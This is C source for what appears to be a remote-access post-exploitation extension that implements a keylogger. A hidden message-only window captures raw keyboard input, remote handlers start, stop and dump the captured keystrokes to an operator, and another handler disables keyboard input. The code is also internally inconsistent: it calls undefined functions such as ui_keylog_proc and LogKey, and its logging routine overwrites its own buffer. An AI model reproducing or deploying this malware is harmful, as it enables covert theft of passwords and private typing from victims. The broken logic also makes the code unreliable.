#include "precomp.h"

#include <tchar.h>

extern HMODULE hookLibrary;
extern HINSTANCE hAppInstance;

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

/*
 * Enables or disables keyboard input
 */
DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD (*enableKeyboardInput)(BOOL enable) = (DWORD (*)(BOOL))GetProcAddress(
				hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false=0, true=1 } bool;

bool boom[1024];
const char g_szClassName[] = "klwClass";
HANDLE tKeyScan = NULL;
char *key_scan_buf = NULL;
unsigned int lenKeyScanBuff = 0;
int KeyScanSize = 1024*1024;
int KeyScanIndex = 0;


/*
 *  key logger updates begin here
 */

int WINAPI ui_keyscan_proc()
{
WNDCLASSEX klwc;
    HWND hwnd;
    MSG msg;

    // register window class
    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
    klwc.cbSize        = sizeof(WNDCLASSEX);
    klwc.lpfnWndProc   = ui_keyscan_wndproc;
    klwc.hInstance     = hAppInstance;
    klwc.lpszClassName = g_szClassName;
    
    if(!RegisterClassEx(&klwc))
    {
        return 0;
    }
    
    // initialize key_scan_buf
    if(key_scan_buf) {
        free(key_scan_buf);
        key_scan_buf = NULL;
        KeyScanIndex = 0;
    }

    key_scan_buf = calloc(KeyScanSize, sizeof(char));

    // create message-only window
    hwnd = CreateWindowEx(
        0,
        g_szClassName,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE, NULL, hAppInstance, NULL
    );

    if(!hwnd)
    {
        return 0;
    }
    
    // message loop
    while(GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return msg.wParam;
}

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT *buffer;
    
    switch(msg)
    {
        // register raw input device
        case WM_CREATE:
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hwnd;
            
            if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
            {
                return -1;
            }
            
        case WM_INPUT:
            // request size of the raw input buffer to dwSize
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                sizeof(RAWINPUTHEADER));
        
            // allocate buffer for input data
            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
        
            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
                sizeof(RAWINPUTHEADER)))
            {
                // if this is keyboard message and WM_KEYDOWN, log the key
                if(buffer->header.dwType == RIM_TYPEKEYBOARD
                    && buffer->data.keyboard.Message == WM_KEYDOWN)
                {
                    if(LogKey(buffer->data.keyboard.VKey) == -1)
                        DestroyWindow(hwnd);
                }
            }
        
            // free the buffer
            HeapFree(GetProcessHeap(), 0, buffer);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

/*
 * Starts the keyboard sniffer
 */
DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;

	if(tKeyScan) {
		result = 1;
	} else {
		// Make sure we have access to the input desktop
		if(GetAsyncKeyState(0x0a) == 0) {
			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keylog_proc, NULL, 0, NULL);
		} else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Stops they keyboard sniffer
 */
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		TerminateThread(tKeyScan, 0);
		tKeyScan = NULL;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes
 */
DWORD request_ui_get_keys(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, key_scan_buf);
		memset(key_scan_buf, 0, KeyScanSize);
		KeyScanIndex = 0;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * log keystrokes
 * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
 * remove text file logging code along with any ref to hLog and simply concatenate 
 * everything into KeyScanBuff
 */

int ui_log_key(UINT vKey)
{
    BYTE lpKeyboard[256];
    char szKey[32];
    WORD wKey;
    int len;

    GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
    GetKeyboardState(lpKeyboard);
    
    len = 0;
    switch(vKey)
    {
        case VK_BACK:
            len += wsprintf(key_scan_buf, "[BP]");
            break;
        case VK_RETURN:
            len = 2;
            strcpy(key_scan_buf, "\r\n");
            break;
        case VK_SHIFT:
            break;
        default:
            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
                len = wsprintf(key_scan_buf, "%c", (char)wKey);
            }
            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0) {
                len = wsprintf(key_scan_buf, "[%s]", szKey);
            }
            break;
    }
    return 0;
}

/*
 * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
 */
